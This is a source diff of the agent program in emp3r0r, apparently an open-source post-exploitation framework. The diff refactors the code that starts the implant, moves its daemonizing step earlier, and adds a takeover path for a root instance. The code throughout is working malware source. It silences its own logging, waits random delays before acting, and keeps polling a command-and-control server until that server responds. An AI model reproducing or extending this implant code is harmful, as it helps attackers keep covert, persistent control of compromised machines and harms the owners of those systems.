@@ -12,8 +12,9 @@ import (
 	"strings"
 	"time"
 
-	"github.com/jm33-m0/emp3r0r/core/internal/agent"
-	"github.com/jm33-m0/emp3r0r/core/internal/tun"
+	"github.com/jm33-m0/emp3r0r/core/lib/agent"
+	"github.com/jm33-m0/emp3r0r/core/lib/tun"
+	"github.com/jm33-m0/emp3r0r/core/lib/util"
 	cdn2proxy "github.com/jm33-m0/go-cdn2proxy"
 )
 
@@ -34,7 +35,7 @@ func main() {
 	}
 
 	// don't be hasty
-	time.Sleep(time.Duration(agent.RandInt(3, 10)) * time.Second)
+	time.Sleep(time.Duration(util.RandInt(3, 10)) * time.Second)
 
 	// silent switch
 	log.SetOutput(ioutil.Discard)
@@ -44,11 +45,30 @@ func main() {
 	}
 
 	// mkdir -p
-	if !agent.IsFileExist(agent.UtilsPath) {
+	if !util.IsFileExist(agent.UtilsPath) {
 		err = os.MkdirAll(agent.UtilsPath, 0700)
 		if err != nil {
 			log.Fatalf("[-] Cannot mkdir %s: %v", agent.AgentRoot, err)
 		}
+	}
+
+	// daemonize
+	if *daemon {
+		args := os.Args[1:]
+		i := 0
+		for ; i < len(args); i++ {
+			if args[i] == "-daemon=true" || args[i] == "-daemon" {
+				args[i] = "-daemon=false"
+				break
+			}
+		}
+		cmd := exec.Command(os.Args[0], args...)
+		err := cmd.Start()
+		if err != nil {
+			log.Fatal(err)
+		}
+		log.Printf("%s is starting in background wit PID %d...", os.Args[0], cmd.Process.Pid)
+		os.Exit(0)
 	}
 
 	// if the agent's process name is not "emp3r0r"
@@ -61,7 +81,11 @@ func main() {
 
 		// exit, leave the existing agent instance running
 		if agent.IsAgentAlive() {
-			log.Fatal("Agent is already running and responsive, aborting")
+			if os.Geteuid() == 0 && agent.ProcUID(pid) != "0" {
+				log.Println("Escalating privilege...")
+			} else {
+				log.Fatal("Agent is already running and responsive, aborting")
+			}
 		}
 
 		// if agent is not responsive, kill it, and start a new instance
@@ -73,24 +97,6 @@ func main() {
 
 	// start socket listener
 	go socketListen()
-
-	// daemonize
-	if *daemon {
-		args := os.Args[1:]
-		i := 0
-		for ; i < len(args); i++ {
-			if args[i] == "-daemon=true" {
-				args[i] = "-daemon=false"
-				break
-			}
-		}
-		cmd := exec.Command(os.Args[0], args...)
-		err := cmd.Start()
-		if err != nil {
-			log.Fatal(err)
-		}
-		os.Exit(0)
-	}
 
 	// do we have internet?
 	if tun.HasInternetAccess() {
@@ -166,13 +172,21 @@ func main() {
 		log.Print(err)
 	}
 
+	// agent root
+	if !util.IsFileExist(agent.AgentRoot) {
+		err = os.MkdirAll(agent.AgentRoot, 0700)
+		if err != nil {
+			log.Printf("MkdirAll %s: %v", agent.AgentRoot, err)
+		}
+	}
+
 	// apply whatever proxy setting we have just added
 	agent.HTTPClient = tun.EmpHTTPClient(agent.AgentProxy)
 connect:
 	// check preset CC status URL, if CC is supposed to be offline, take a nap
 	if !agent.IsCCOnline(agent.AgentProxy) {
 		log.Println("CC not online")
-		time.Sleep(time.Duration(agent.RandInt(1, 120)) * time.Minute)
+		time.Sleep(time.Duration(util.RandInt(1, 120)) * time.Minute)
 		goto connect
 	}
 
@@ -205,7 +219,7 @@ connect:
 // listen on a unix socket
 func socketListen() {
 	// if socket file exists
-	if agent.IsFileExist(agent.SocketName) {
+	if util.IsFileExist(agent.SocketName) {
 		log.Printf("%s exists, testing connection...", agent.SocketName)
 		if agent.IsAgentAlive() {
 			log.Fatalf("%s exists, and agent is alive, aborting", agent.SocketName)
